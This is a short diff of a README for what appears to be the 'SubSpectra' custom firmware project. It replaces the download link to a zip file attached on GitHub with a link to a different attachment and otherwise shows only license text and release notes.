@@ -118,9 +118,10 @@ GNU LICENSING
  Everyone is permitted to copy and distribute verbatim copies
  of this license document, but changing it is not allowed.
 
+
 ***
 ## Download
-Click here to download the latest version of SubSpectra[SubSpectra.custom.firmware.zip](https://github.com/user-attachments/files/22583560/SubSpectra.custom.firmware.zip)
+Click here to download the latest version of SubSpectra[SubSpectra.custom.firmware.zip](https://github.com/user-attachments/files/24332215/SubSpectra-Firmware-def-dev.zip)
 If you want old versions, go to release and find the version you want to download. Click on the download button featured in all releases.
 If you want pre-releases then you can sign up on our discord server.
 For more information on downloading go to https://docs.flipper.net/
